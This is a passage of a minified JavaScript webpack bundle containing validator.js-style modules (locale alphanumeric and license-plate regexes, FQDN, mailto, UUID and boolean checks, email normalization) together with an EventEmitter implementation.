                "ku-IQ": /^[\u0660\u0661\u0662\u0663\u0664\u0665\u0666\u0667\u0668\u06690-9\u0626\u0627\u0628\u067e\u062a\u062c\u0686\u062d\u062e\u062f\u0631\u0695\u0632\u0698\u0633\u0634\u0639\u063a\u0641\u06a4\u0642\u06a9\u06af\u0644\u06b5\u0645\u0646\u0648\u06c6\u06be\u06d5\u06cc\u06ce\u064a\u0637\u0624\u062b\u0622\u0625\u0623\u0643\u0636\u0635\u0629\u0638\u0630]+$/i,
                "vi-VN": /^[0-9A-Z\xc0\xc1\u1ea0\u1ea2\xc3\xc2\u1ea6\u1ea4\u1eac\u1ea8\u1eaa\u0102\u1eb0\u1eae\u1eb6\u1eb2\u1eb4\u0110\xc8\xc9\u1eb8\u1eba\u1ebc\xca\u1ec0\u1ebe\u1ec6\u1ec2\u1ec4\xcc\xcd\u1eca\u1ec8\u0128\xd2\xd3\u1ecc\u1ece\xd5\xd4\u1ed2\u1ed0\u1ed8\u1ed4\u1ed6\u01a0\u1edc\u1eda\u1ee2\u1ede\u1ee0\xd9\xda\u1ee4\u1ee6\u0168\u01af\u1eea\u1ee8\u1ef0\u1eec\u1eee\u1ef2\xdd\u1ef4\u1ef6\u1ef8]+$/i,
                ar: /^[\u0660\u0661\u0662\u0663\u0664\u0665\u0666\u0667\u0668\u06690-9\u0621\u0622\u0623\u0624\u0625\u0626\u0627\u0628\u0629\u062a\u062b\u062c\u062d\u062e\u062f\u0630\u0631\u0632\u0633\u0634\u0635\u0636\u0637\u0638\u0639\u063a\u0641\u0642\u0643\u0644\u0645\u0646\u0647\u0648\u0649\u064a\u064b\u064c\u064d\u064e\u064f\u0650\u0651\u0652\u0670]+$/,
                he: /^[0-9\u05d0-\u05ea]+$/,
                fa: /^['0-9\u0622\u0627\u0621\u0623\u0624\u0626\u0628\u067e\u062a\u062b\u062c\u0686\u062d\u062e\u062f\u0630\u0631\u0632\u0698\u0633\u0634\u0635\u0636\u0637\u0638\u0639\u063a\u0641\u0642\u06a9\u06af\u0644\u0645\u0646\u0648\u0647\u0629\u06cc\u06f1\u06f2\u06f3\u06f4\u06f5\u06f6\u06f7\u06f8\u06f9\u06f0']+$/i,
                bn: /^['\u0980\u0981\u0982\u0983\u0985\u0986\u0987\u0988\u0989\u098a\u098b\u098c\u098f\u0990\u0993\u0994\u0995\u0996\u0997\u0998\u0999\u099a\u099b\u099c\u099d\u099e\u099f\u09a0\u09a1\u09a2\u09a3\u09a4\u09a5\u09a6\u09a7\u09a8\u09aa\u09ab\u09ac\u09ad\u09ae\u09af\u09b0\u09b2\u09b6\u09b7\u09b8\u09b9\u09bc\u09bd\u09be\u09bf\u09c0\u09c1\u09c2\u09c3\u09c4\u09c7\u09c8\u09cb\u09cc\u09cd\u09ce\u09d7\u09dc\u09dd\u09df\u09e0\u09e1\u09e2\u09e3\u09e6\u09e7\u09e8\u09e9\u09ea\u09eb\u09ec\u09ed\u09ee\u09ef\u09f0\u09f1\u09f2\u09f3\u09f4\u09f5\u09f6\u09f7\u09f8\u09f9\u09fa\u09fb']+$/,
                eo: /^[0-9ABC\u0108D-G\u011cH\u0124IJ\u0134K-PRS\u015cTU\u016cVZ]+$/i,
                "hi-IN": /^[\u0900-\u0963]+[\u0966-\u097F]*$/i,
                "si-LK": /^[0-9\u0D80-\u0DFF]+$/
            }, i = t.decimal = {
                "en-US": ".",
                ar: "\u066b"
            }, s = t.englishLocales = ["AU", "GB", "HK", "IN", "NZ", "ZA", "ZM"], a = 0; a < s.length; a++)
                n[r = "en-".concat(s[a])] = n["en-US"],
                o[r] = o["en-US"],
                i[r] = i["en-US"];
            for (var c, l = t.arabicLocales = ["AE", "BH", "DZ", "EG", "IQ", "JO", "KW", "LB", "LY", "MA", "QM", "QA", "SA", "SD", "SY", "TN", "YE"], u = 0; u < l.length; u++)
                n[c = "ar-".concat(l[u])] = n.ar,
                o[c] = o.ar,
                i[c] = i.ar;
            for (var d, h = t.farsiLocales = ["IR", "AF"], f = 0; f < h.length; f++)
                o[d = "fa-".concat(h[f])] = o.fa,
                i[d] = i.ar;
            for (var p, g = t.bengaliLocales = ["BD", "IN"], y = 0; y < g.length; y++)
                n[p = "bn-".concat(g[y])] = n.bn,
                o[p] = o.bn,
                i[p] = i["en-US"];
            for (var m = t.dotDecimal = ["ar-EG", "ar-LB", "ar-LY"], b = t.commaDecimal = ["bg-BG", "cs-CZ", "da-DK", "de-DE", "el-GR", "en-ZM", "eo", "es-ES", "fr-CA", "fr-FR", "id-ID", "it-IT", "ku-IQ", "hi-IN", "hu-HU", "nb-NO", "nn-NO", "nl-NL", "pl-PL", "pt-PT", "ru-RU", "kk-KZ", "si-LK", "sl-SI", "sr-RS@latin", "sr-RS", "sv-SE", "tr-TR", "uk-UA", "vi-VN"], v = 0; v < m.length; v++)
                i[m[v]] = i["en-US"];
            for (var w = 0; w < b.length; w++)
                i[b[w]] = ",";
            n["fr-CA"] = n["fr-FR"],
            o["fr-CA"] = o["fr-FR"],
            n["pt-BR"] = n["pt-PT"],
            o["pt-BR"] = o["pt-PT"],
            i["pt-BR"] = i["pt-PT"],
            n["pl-Pl"] = n["pl-PL"],
            o["pl-Pl"] = o["pl-PL"],
            i["pl-Pl"] = i["pl-PL"],
            n["fa-AF"] = n.fa
        }
        ,
        7891: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                n.default)(e),
                (t = (0,
                o.default)(t, s)).allow_trailing_dot && "." === e[e.length - 1] && (e = e.substring(0, e.length - 1));
                !0 === t.allow_wildcard && 0 === e.indexOf("*.") && (e = e.substring(2));
                var r = e.split(".")
                  , i = r[r.length - 1];
                if (t.require_tld) {
                    if (r.length < 2)
                        return !1;
                    if (!t.allow_numeric_tld && !/^([a-z\u00A1-\u00A8\u00AA-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]{2,}|xn[a-z0-9-]{2,})$/i.test(i))
                        return !1;
                    if (/\s/.test(i))
                        return !1
                }
                if (!t.allow_numeric_tld && /^\d+$/.test(i))
                    return !1;
                return r.every((function(e) {
                    return !(e.length > 63 && !t.ignore_max_length) && (!!/^[a-z_\u00a1-\uffff0-9-]+$/i.test(e) && (!/[\uff01-\uff5e]/.test(e) && (!/^-|-$/.test(e) && !(!t.allow_underscores && /_/.test(e)))))
                }
                ))
            }
            ;
            var n = i(r(8804))
              , o = i(r(3975));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = {
                require_tld: !0,
                allow_underscores: !1,
                allow_trailing_dot: !1,
                allow_numeric_tld: !1,
                allow_wildcard: !1,
                ignore_max_length: !1
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7894: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                i.default)(e),
                0 !== e.indexOf("mailto:"))
                    return !1;
                var r = a(e.replace("mailto:", "").split("?"), 2)
                  , s = r[0]
                  , l = r[1]
                  , u = void 0 === l ? "" : l;
                if (!s && !u)
                    return !0;
                var d = function(e) {
                    var t = new Set(["subject", "body", "cc", "bcc"])
                      , r = {
                        cc: "",
                        bcc: ""
                    }
                      , n = !1
                      , o = e.split("&");
                    if (o.length > 4)
                        return !1;
                    var i, s = function(e, t) {
                        var r = "undefined" !== typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
                        if (!r) {
                            if (Array.isArray(e) || (r = c(e)) || t && e && "number" === typeof e.length) {
                                r && (e = r);
                                var n = 0
                                  , o = function() {};
                                return {
                                    s: o,
                                    n: function() {
                                        return n >= e.length ? {
                                            done: !0
                                        } : {
                                            done: !1,
                                            value: e[n++]
                                        }
                                    },
                                    e: function(e) {
                                        throw e
                                    },
                                    f: o
                                }
                            }
                            throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                        }
                        var i, s = !0, a = !1;
                        return {
                            s: function() {
                                r = r.call(e)
                            },
                            n: function() {
                                var e = r.next();
                                return s = e.done,
                                e
                            },
                            e: function(e) {
                                a = !0,
                                i = e
                            },
                            f: function() {
                                try {
                                    s || null == r.return || r.return()
                                } finally {
                                    if (a)
                                        throw i
                                }
                            }
                        }
                    }(o);
                    try {
                        for (s.s(); !(i = s.n()).done; ) {
                            var l = a(i.value.split("="), 2)
                              , u = l[0]
                              , d = l[1];
                            if (u && !t.has(u)) {
                                n = !0;
                                break
                            }
                            !d || "cc" !== u && "bcc" !== u || (r[u] = d),
                            u && t.delete(u)
                        }
                    } catch (h) {
                        s.e(h)
                    } finally {
                        s.f()
                    }
                    return !n && r
                }(u);
                if (!d)
                    return !1;
                return "".concat(s, ",").concat(d.cc, ",").concat(d.bcc).split(",").every((function(e) {
                    return !(e = (0,
                    n.default)(e, " ")) || (0,
                    o.default)(e, t)
                }
                ))
            }
            ;
            var n = s(r(7244))
              , o = s(r(498))
              , i = s(r(8804));
            function s(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            function a(e, t) {
                return function(e) {
                    if (Array.isArray(e))
                        return e
                }(e) || function(e, t) {
                    var r = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
                    if (null != r) {
                        var n, o, i, s, a = [], c = !0, l = !1;
                        try {
                            if (i = (r = r.call(e)).next,
                            0 === t) {
                                if (Object(r) !== r)
                                    return;
                                c = !1
                            } else
                                for (; !(c = (n = i.call(r)).done) && (a.push(n.value),
                                a.length !== t); c = !0)
                                    ;
                        } catch (e) {
                            l = !0,
                            o = e
                        } finally {
                            try {
                                if (!c && null != r.return && (s = r.return(),
                                Object(s) !== s))
                                    return
                            } finally {
                                if (l)
                                    throw o
                            }
                        }
                        return a
                    }
                }(e, t) || c(e, t) || function() {
                    throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
                }()
            }
            function c(e, t) {
                if (e) {
                    if ("string" === typeof e)
                        return l(e, t);
                    var r = Object.prototype.toString.call(e).slice(8, -1);
                    return "Object" === r && e.constructor && (r = e.constructor.name),
                    "Map" === r || "Set" === r ? Array.from(e) : "Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r) ? l(e, t) : void 0
                }
            }
            function l(e, t) {
                (null == t || t > e.length) && (t = e.length);
                for (var r = 0, n = new Array(t); r < t; r++)
                    n[r] = e[r];
                return n
            }
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        7943: (e, t, r) => {
            const n = r(4231);
            e.exports = (e, t) => e.sort(( (e, r) => n(r, e, t)))
        }
        ,
        7950: (e, t, r) => {
            "use strict";
            !function e() {
                if ("undefined" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && "function" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)
                    try {
                        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e)
                    } catch (t) {
                        console.error(t)
                    }
            }(),
            e.exports = r(6672)
        }
        ,
        7961: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                e = Date.parse(e),
                isNaN(e) ? null : new Date(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8077: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                o.default)(e),
                t in i)
                    return i[t](e);
                if ("any" === t) {
                    for (var r in i) {
                        if ((0,
                        i[r])(e))
                            return !0
                    }
                    return !1
                }
                throw new Error("Invalid locale '".concat(t, "'"))
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                "cs-CZ": function(e) {
                    return /^(([ABCDEFHIJKLMNPRSTUVXYZ]|[0-9])-?){5,8}$/.test(e)
                },
                "de-DE": function(e) {
                    return /^((A|AA|AB|AC|AE|AH|AK|AM|AN|A\xd6|AP|AS|AT|AU|AW|AZ|B|BA|BB|BC|BE|BF|BH|BI|BK|BL|BM|BN|BO|B\xd6|BS|BT|BZ|C|CA|CB|CE|CO|CR|CW|D|DA|DD|DE|DH|DI|DL|DM|DN|DO|DU|DW|DZ|E|EA|EB|ED|EE|EF|EG|EH|EI|EL|EM|EN|ER|ES|EU|EW|F|FB|FD|FF|FG|FI|FL|FN|FO|FR|FS|FT|F\xdc|FW|FZ|G|GA|GC|GD|GE|GF|GG|GI|GK|GL|GM|GN|G\xd6|GP|GR|GS|GT|G\xdc|GV|GW|GZ|H|HA|HB|HC|HD|HE|HF|HG|HH|HI|HK|HL|HM|HN|HO|HP|HR|HS|HU|HV|HX|HY|HZ|IK|IL|IN|IZ|J|JE|JL|K|KA|KB|KC|KE|KF|KG|KH|KI|KK|KL|KM|KN|KO|KR|KS|KT|KU|KW|KY|L|LA|LB|LC|LD|LF|LG|LH|LI|LL|LM|LN|L\xd6|LP|LR|LU|M|MA|MB|MC|MD|ME|MG|MH|MI|MK|ML|MM|MN|MO|MQ|MR|MS|M\xdc|MW|MY|MZ|N|NB|ND|NE|NF|NH|NI|NK|NM|N\xd6|NP|NR|NT|NU|NW|NY|NZ|OA|OB|OC|OD|OE|OF|OG|OH|OK|OL|OP|OS|OZ|P|PA|PB|PE|PF|PI|PL|PM|PN|PR|PS|PW|PZ|R|RA|RC|RD|RE|RG|RH|RI|RL|RM|RN|RO|RP|RS|RT|RU|RV|RW|RZ|S|SB|SC|SE|SG|SI|SK|SL|SM|SN|SO|SP|SR|ST|SU|SW|SY|SZ|TE|TF|TG|TO|TP|TR|TS|TT|T\xdc|\xdcB|UE|UH|UL|UM|UN|V|VB|VG|VK|VR|VS|W|WA|WB|WE|WF|WI|WK|WL|WM|WN|WO|WR|WS|WT|W\xdc|WW|WZ|Z|ZE|ZI|ZP|ZR|ZW|ZZ)[- ]?[A-Z]{1,2}[- ]?\d{1,4}|(ABG|ABI|AIB|AIC|ALF|ALZ|ANA|ANG|ANK|APD|ARN|ART|ASL|ASZ|AUR|AZE|BAD|BAR|BBG|BCH|BED|BER|BGD|BGL|BID|BIN|BIR|BIT|BIW|BKS|BLB|BLK|BNA|BOG|BOH|BOR|BOT|BRA|BRB|BRG|BRK|BRL|BRV|BSB|BSK|BTF|B\xdcD|BUL|B\xdcR|B\xdcS|B\xdcZ|CAS|CHA|CLP|CLZ|COC|COE|CUX|DAH|DAN|DAU|DBR|DEG|DEL|DGF|DIL|DIN|DIZ|DKB|DLG|DON|DUD|D\xdcW|EBE|EBN|EBS|ECK|EIC|EIL|EIN|EIS|EMD|EMS|ERB|ERH|ERK|ERZ|ESB|ESW|FDB|FDS|FEU|FFB|FKB|FL\xd6|FOR|FRG|FRI|FRW|FTL|F\xdcS|GAN|GAP|GDB|GEL|GEO|GER|GHA|GHC|GLA|GMN|GNT|GOA|GOH|GRA|GRH|GRI|GRM|GRZ|GTH|GUB|GUN|GVM|HAB|HAL|HAM|HAS|HBN|HBS|HCH|HDH|HDL|HEB|HEF|HEI|HER|HET|HGN|HGW|HHM|HIG|HIP|HM\xdc|HOG|HOH|HOL|HOM|HOR|H\xd6S|HOT|HRO|HSK|HST|HVL|HWI|IGB|ILL|J\xdcL|KEH|KEL|KEM|KIB|KLE|KLZ|K\xd6N|K\xd6T|K\xd6Z|KRU|K\xdcN|KUS|KYF|LAN|LAU|LBS|LBZ|LDK|LDS|LEO|LER|LEV|LIB|LIF|LIP|L\xd6B|LOS|LRO|LSZ|L\xdcN|LUP|LWL|MAB|MAI|MAK|MAL|MED|MEG|MEI|MEK|MEL|MER|MET|MGH|MGN|MHL|MIL|MKK|MOD|MOL|MON|MOS|MSE|MSH|MSP|MST|MTK|MTL|M\xdcB|M\xdcR|MYK|MZG|NAB|NAI|NAU|NDH|NEA|NEB|NEC|NEN|NES|NEW|NMB|NMS|NOH|NOL|NOM|NOR|NVP|NWM|OAL|OBB|OBG|OCH|OHA|\xd6HR|OHV|OHZ|OPR|OSL|OVI|OVL|OVP|PAF|PAN|PAR|PCH|PEG|PIR|PL\xd6|PR\xdc|QFT|QLB|RDG|REG|REH|REI|RID|RIE|ROD|ROF|ROK|ROL|ROS|ROT|ROW|RSL|R\xdcD|R\xdcG|SAB|SAD|SAN|SAW|SBG|SBK|SCZ|SDH|SDL|SDT|SEB|SEE|SEF|SEL|SFB|SFT|SGH|SHA|SHG|SHK|SHL|SIG|SIM|SLE|SLF|SLK|SLN|SLS|SL\xdc|SLZ|SM\xdc|SOB|SOG|SOK|S\xd6M|SON|SPB|SPN|SRB|SRO|STA|STB|STD|STE|STL|SUL|S\xdcW|SWA|SZB|TBB|TDO|TET|TIR|T\xd6L|TUT|UEM|UER|UFF|USI|VAI|VEC|VER|VIB|VIE|VIT|VOH|WAF|WAK|WAN|WAR|WAT|WBS|WDA|WEL|WEN|WER|WES|WHV|WIL|WIS|WIT|WIZ|WLG|WMS|WND|WOB|WOH|WOL|WOR|WOS|WRN|WSF|WST|WSW|WTL|WTM|WUG|W\xdcM|WUN|WUR|WZL|ZEL|ZIG)[- ]?(([A-Z][- ]?\d{1,4})|([A-Z]{2}[- ]?\d{1,3})))[- ]?(E|H)?$/.test(e)
                },
                "de-LI": function(e) {
                    return /^FL[- ]?\d{1,5}[UZ]?$/.test(e)
                },
                "en-IN": function(e) {
                    return /^[A-Z]{2}[ -]?[0-9]{1,2}(?:[ -]?[A-Z])(?:[ -]?[A-Z]*)?[ -]?[0-9]{4}$/.test(e)
                },
                "es-AR": function(e) {
                    return /^(([A-Z]{2} ?[0-9]{3} ?[A-Z]{2})|([A-Z]{3} ?[0-9]{3}))$/.test(e)
                },
                "fi-FI": function(e) {
                    return /^(?=.{4,7})(([A-Z]{1,3}|[0-9]{1,3})[\s-]?([A-Z]{1,3}|[0-9]{1,5}))$/.test(e)
                },
                "hu-HU": function(e) {
                    return /^((((?!AAA)(([A-NPRSTVZWXY]{1})([A-PR-Z]{1})([A-HJ-NPR-Z]))|(A[ABC]I)|A[ABC]O|A[A-W]Q|BPI|BPO|UCO|UDO|XAO)-(?!000)\d{3})|(M\d{6})|((CK|DT|CD|HC|H[ABEFIKLMNPRSTVX]|MA|OT|R[A-Z]) \d{2}-\d{2})|(CD \d{3}-\d{3})|(C-(C|X) \d{4})|(X-(A|B|C) \d{4})|(([EPVZ]-\d{5}))|(S A[A-Z]{2} \d{2})|(SP \d{2}-\d{2}))$/.test(e)
                },
                "pt-BR": function(e) {
                    return /^[A-Z]{3}[ -]?[0-9][A-Z][0-9]{2}|[A-Z]{3}[ -]?[0-9]{4}$/.test(e)
                },
                "pt-PT": function(e) {
                    return /^([A-Z]{2}|[0-9]{2})[ -\xb7]?([A-Z]{2}|[0-9]{2})[ -\xb7]?([A-Z]{2}|[0-9]{2})$/.test(e)
                },
                "sq-AL": function(e) {
                    return /^[A-Z]{2}[- ]?((\d{3}[- ]?(([A-Z]{2})|T))|(R[- ]?\d{3}))$/.test(e)
                },
                "sv-SE": function(e) {
                    return /^[A-HJ-PR-UW-Z]{3} ?[\d]{2}[A-HJ-PR-UW-Z1-9]$|(^[A-Z\xc5\xc4\xd6 ]{2,7}$)/.test(e.trim())
                },
                "en-PK": function(e) {
                    return /(^[A-Z]{2}((\s|-){0,1})[0-9]{3,4}((\s|-)[0-9]{2}){0,1}$)|(^[A-Z]{3}((\s|-){0,1})[0-9]{3,4}((\s|-)[0-9]{2}){0,1}$)|(^[A-Z]{4}((\s|-){0,1})[0-9]{3,4}((\s|-)[0-9]{2}){0,1}$)|(^[A-Z]((\s|-){0,1})[0-9]{4}((\s|-)[0-9]{2}){0,1}$)/.test(e.trim())
                }
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8129: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            const n = r(6613);
            n.__exportStar(r(364), t),
            n.__exportStar(r(6454), t)
        }
        ,
        8167: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "en-US"
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                (0,
                o.default)(e);
                var n = e
                  , s = r.ignore;
                if (s)
                    if (s instanceof RegExp)
                        n = n.replace(s, "");
                    else {
                        if ("string" !== typeof s)
                            throw new Error("ignore should be instance of a String or RegExp");
                        n = n.replace(new RegExp("[".concat(s.replace(/[-[\]{}()*+?.,\\^$|#\\s]/g, "\\$&"), "]"),"g"), "")
                    }
                if (t in i.alphanumeric)
                    return i.alphanumeric[t].test(n);
                throw new Error("Invalid locale '".concat(t, "'"))
            }
            ,
            t.locales = void 0;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            }, i = r(7858);
            t.locales = Object.keys(i.alphanumeric)
        }
        ,
        8221: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                i.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^[\x00-\x7F]+$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8239: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                o.default)(e);
                var r = i[[void 0, null].includes(t) ? "all" : t];
                return !!r && r.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                1: /^[0-9A-F]{8}-[0-9A-F]{4}-1[0-9A-F]{3}-[0-9A-F]{4}-[0-9A-F]{12}$/i,
                2: /^[0-9A-F]{8}-[0-9A-F]{4}-2[0-9A-F]{3}-[0-9A-F]{4}-[0-9A-F]{12}$/i,
                3: /^[0-9A-F]{8}-[0-9A-F]{4}-3[0-9A-F]{3}-[0-9A-F]{4}-[0-9A-F]{12}$/i,
                4: /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i,
                5: /^[0-9A-F]{8}-[0-9A-F]{4}-5[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i,
                7: /^[0-9A-F]{8}-[0-9A-F]{4}-7[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i,
                all: /^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$/i
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8251: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            const n = r(6121);
            n.__exportStar(r(8951), t),
            n.__exportStar(r(5746), t)
        }
        ,
        8411: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                e === e.toLowerCase()
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8461: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                o.default)(e),
                t)
                    return "1" === e || /^true$/i.test(e);
                return "0" !== e && !/^false$/i.test(e) && "" !== e
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        8470: e => {
            "use strict";
            var t = Object.prototype.hasOwnProperty
              , r = "~";
            function n() {}
            function o(e, t, r) {
                this.fn = e,
                this.context = t,
                this.once = r || !1
            }
            function i(e, t, n, i, s) {
                if ("function" !== typeof n)
                    throw new TypeError("The listener must be a function");
                var a = new o(n,i || e,s)
                  , c = r ? r + t : t;
                return e._events[c] ? e._events[c].fn ? e._events[c] = [e._events[c], a] : e._events[c].push(a) : (e._events[c] = a,
                e._eventsCount++),
                e
            }
            function s(e, t) {
                0 === --e._eventsCount ? e._events = new n : delete e._events[t]
            }
            function a() {
                this._events = new n,
                this._eventsCount = 0
            }
            Object.create && (n.prototype = Object.create(null),
            (new n).__proto__ || (r = !1)),
            a.prototype.eventNames = function() {
                var e, n, o = [];
                if (0 === this._eventsCount)
                    return o;
                for (n in e = this._events)
                    t.call(e, n) && o.push(r ? n.slice(1) : n);
                return Object.getOwnPropertySymbols ? o.concat(Object.getOwnPropertySymbols(e)) : o
            }
            ,
            a.prototype.listeners = function(e) {
                var t = r ? r + e : e
                  , n = this._events[t];
                if (!n)
                    return [];
                if (n.fn)
                    return [n.fn];
                for (var o = 0, i = n.length, s = new Array(i); o < i; o++)
                    s[o] = n[o].fn;
                return s
            }
            ,
            a.prototype.listenerCount = function(e) {
                var t = r ? r + e : e
                  , n = this._events[t];
                return n ? n.fn ? 1 : n.length : 0
            }
            ,
            a.prototype.emit = function(e, t, n, o, i, s) {
                var a = r ? r + e : e;
                if (!this._events[a])
                    return !1;
                var c, l, u = this._events[a], d = arguments.length;
                if (u.fn) {
                    switch (u.once && this.removeListener(e, u.fn, void 0, !0),
                    d) {
                    case 1:
                        return u.fn.call(u.context),
                        !0;
                    case 2:
                        return u.fn.call(u.context, t),
                        !0;
                    case 3:
                        return u.fn.call(u.context, t, n),
                        !0;
                    case 4:
                        return u.fn.call(u.context, t, n, o),
                        !0;
                    case 5:
                        return u.fn.call(u.context, t, n, o, i),
                        !0;
                    case 6:
                        return u.fn.call(u.context, t, n, o, i, s),
                        !0
                    }
                    for (l = 1,
                    c = new Array(d - 1); l < d; l++)
                        c[l - 1] = arguments[l];
                    u.fn.apply(u.context, c)
                } else {
                    var h, f = u.length;
                    for (l = 0; l < f; l++)
                        switch (u[l].once && this.removeListener(e, u[l].fn, void 0, !0),
                        d) {
                        case 1:
                            u[l].fn.call(u[l].context);
                            break;
                        case 2:
                            u[l].fn.call(u[l].context, t);
                            break;
                        case 3:
                            u[l].fn.call(u[l].context, t, n);
                            break;
                        case 4:
                            u[l].fn.call(u[l].context, t, n, o);
                            break;
                        default:
                            if (!c)
                                for (h = 1,
                                c = new Array(d - 1); h < d; h++)
                                    c[h - 1] = arguments[h];
                            u[l].fn.apply(u[l].context, c)
                        }
                }
                return !0
            }
            ,
            a.prototype.on = function(e, t, r) {
                return i(this, e, t, r, !1)
            }
            ,
            a.prototype.once = function(e, t, r) {
                return i(this, e, t, r, !0)
            }
            ,
            a.prototype.removeListener = function(e, t, n, o) {
                var i = r ? r + e : e;
                if (!this._events[i])
                    return this;
                if (!t)
                    return s(this, i),
                    this;
                var a = this._events[i];
                if (a.fn)
                    a.fn !== t || o && !a.once || n && a.context !== n || s(this, i);
                else {
                    for (var c = 0, l = [], u = a.length; c < u; c++)
                        (a[c].fn !== t || o && !a[c].once || n && a[c].context !== n) && l.push(a[c]);
                    l.length ? this._events[i] = 1 === l.length ? l[0] : l : s(this, i)
                }
                return this
            }
            ,
            a.prototype.removeAllListeners = function(e) {
                var t;
                return e ? (t = r ? r + e : e,
                this._events[t] && s(this, t)) : (this._events = new n,
                this._eventsCount = 0),
                this
            }
            ,
            a.prototype.off = a.prototype.removeListener,
            a.prototype.addListener = a.prototype.on,
            a.prefixed = r,
            a.EventEmitter = a,
            e.exports = a
        }
        ,
        8473: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                t = (0,
                o.default)(t, i);
                var r = e.split("@")
                  , n = r.pop()
                  , d = [r.join("@"), n];
                if (d[1] = d[1].toLowerCase(),
                "gmail.com" === d[1] || "googlemail.com" === d[1]) {
                    if (t.gmail_remove_subaddress && (d[0] = d[0].split("+")[0]),
                    t.gmail_remove_dots && (d[0] = d[0].replace(/\.+/g, u)),
                    !d[0].length)
                        return !1;
                    (t.all_lowercase || t.gmail_lowercase) && (d[0] = d[0].toLowerCase()),
                    d[1] = t.gmail_convert_googlemaildotcom ? "gmail.com" : d[1]
                } else if (s.indexOf(d[1]) >= 0) {
                    if (t.icloud_remove_subaddress && (d[0] = d[0].split("+")[0]),
                    !d[0].length)
                        return !1;
                    (t.all_lowercase || t.icloud_lowercase) && (d[0] = d[0].toLowerCase())
                } else if (a.indexOf(d[1]) >= 0) {
                    if (t.outlookdotcom_remove_subaddress && (d[0] = d[0].split("+")[0]),
                    !d[0].length)
                        return !1;
                    (t.all_lowercase || t.outlookdotcom_lowercase) && (d[0] = d[0].toLowerCase())
                } else if (c.indexOf(d[1]) >= 0) {
                    if (t.yahoo_remove_subaddress) {
                        var h = d[0].split("-");
                        d[0] = h.length > 1 ? h.slice(0, -1).join("-") : h[0]
                    }
                    if (!d[0].length)
                        return !1;
                    (t.all_lowercase || t.yahoo_lowercase) && (d[0] = d[0].toLowerCase())
                } else
                    l.indexOf(d[1]) >= 0 ? ((t.all_lowercase || t.yandex_lowercase) && (d[0] = d[0].toLowerCase()),
                    d[1] = "yandex.ru") : t.all_lowercase && (d[0] = d[0].toLowerCase());
                return d.join("@")
            }
            ;
            var n, o = (n = r(3975)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                all_lowercase: !0,
                gmail_lowercase: !0,
                gmail_remove_dots: !0,
                gmail_remove_subaddress: !0,
                gmail_convert_googlemaildotcom: !0,
                outlookdotcom_lowercase: !0,
                outlookdotcom_remove_subaddress: !0,
                yahoo_lowercase: !0,
                yahoo_remove_subaddress: !0,
                yandex_lowercase: !0,
                icloud_lowercase: !0,
                icloud_remove_subaddress: !0
            }
